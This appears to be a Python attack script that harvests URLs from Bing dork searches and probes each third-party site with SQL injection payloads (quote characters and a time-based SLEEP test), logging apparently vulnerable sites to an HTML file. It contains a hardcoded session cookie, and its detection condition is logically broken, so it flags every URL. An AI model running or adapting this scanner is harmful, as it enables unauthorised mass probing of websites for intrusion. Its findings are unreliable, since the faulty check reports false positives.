#!/usr/bin/python3
import sys,requests,threading,time
from bs4 import BeautifulSoup
urla = 'https://cn.bing.com/search?q='
urlb = '&first='
header={
'Host': 'cn.bing.com',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
'Connection': 'keep-alive',
'Cookie': 'DUP=Q=mVtmYzuzKF1E4RGEp16GAw2&T=390299413&A=2&IG=BB1A24E20BB247DEA60F691BEC646E34; SRCHD=AF=NOFORM; SRCHUID=V=2&GUID=7B6F1AAE454B48CFB7194BD3E8F9F9C1&dmnchg=1; SRCHUSR=DOB=20200505&T=1589451212000; _EDGE_V=1; MUID=02684545ACC26CA438B94B84ADEC6DD8; MUIDB=02684545ACC26CA438B94B84ADEC6DD8; SRCHHPGUSR=CW=1920&CH=543&DPR=1&UTC=480&HV=1589451219&WTS=63725048012&NEWWND=1&NRSLT=-1&SRCHLANG=&AS=1&NNT=1&HAP=0; _SS=SID=16FE2359541468FE10782D93553A690C&bIm=SFG; _EDGE_S=mkt=zh-cn&SID=16FE2359541468FE10782D93553A690C; ipv6=hit=1589454816360&t=4; ENSEARCH=BENVER=0; _FP=hta=on; ULC=P=C8DC|1:1&H=C8DC|1:1&T=C8DC|1:1',
'Upgrade-Insecure-Requests': '1',
'Cache-Control': 'max-age=0',
'TE': 'Trailers'
}
header2={
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36 Edg/81.0.416.58'
}
 
huixian = 'on line'
huixian2 = '查询表达式'
huixian3 = 'Microsoft JET Database Engine'
def main(key,ye):
    urlc =  urla + key + urlb + ye
    try:
        r = requests.get(url=urlc,headers=header)
        soup = BeautifulSoup(r.text,'html.parser')
        urls = soup.find_all(name='a',target="_blank",attrs={'class':None,'id':None})
        for a in urls:
            r = requests.get(url=a['href'],headers=header2,timeout = 1)
            if '=' in r.url:
                print(f"target：{r.url}")
                check(r.url)
    except:
        pass
def check(url):
    try:
        payload= url+'%27'
        r = requests.get(url=payload,headers=header2,timeout = 1)
        if huixian or huixian2 or huixian3 in str(r.content):
            result(url)
        payload= url+'"'
        r = requests.get(url=payload,headers=header2,timeout = 1)
        if huixian or huixian2 or huixian3 in str(r.content):
            result(url)
        try:
            timepayload = url + '%20and%20SlEep(2)'
            r = requests.get(url=timepayload,headers=header2,timeout = 1)
        except requests.exceptions.Timeout:
            r = requests.get(url=timepayload,headers=header2,timeout = 3)
            if r.status_code == 200:
                result(timepayload)
    except:
        pass
def result(url):
    result = open('result.html', 'a+')
    with open('result.html') as f:
        if url not in f.read():
            if 'SlEep' not in url:
                print(f"[+]{url}——该网站可能存在注入Σ(⊙▽⊙'a")
                result.write('<a href="' + url + '" target="_blank">' + url +'——该网站可能存在注入Σ(⊙▽⊙"a'+ '</a>'+'\r\n</br>')
            else:
                print(f"[+]{url}——该网站可能存在延时注入Σ(⊙▽⊙'a")
                result.write('<a href="' + url + '" target="_blank">' + url +'——该网站可能存在延时注入Σ(⊙▽⊙"a'+ '</a>'+'\r\n</br>')
            result.close()
 
if __name__ == '__main__':
    if len(sys.argv) == 2:
        key = sys.argv[1]
        print('开始探测存在注入的网站喽~ Σ(⊙▽⊙"a ')
        for i in range(0,800,10):
            threadl = []
            t=threading.Thread(target=main,args=(str(key),str(i)))
            threadl.append(t)
            for s in threadl:
                s.start()
                time.sleep(0.01)
    else:
        print("Tips：python3 sql-bing.py inurl:php?id=")
    

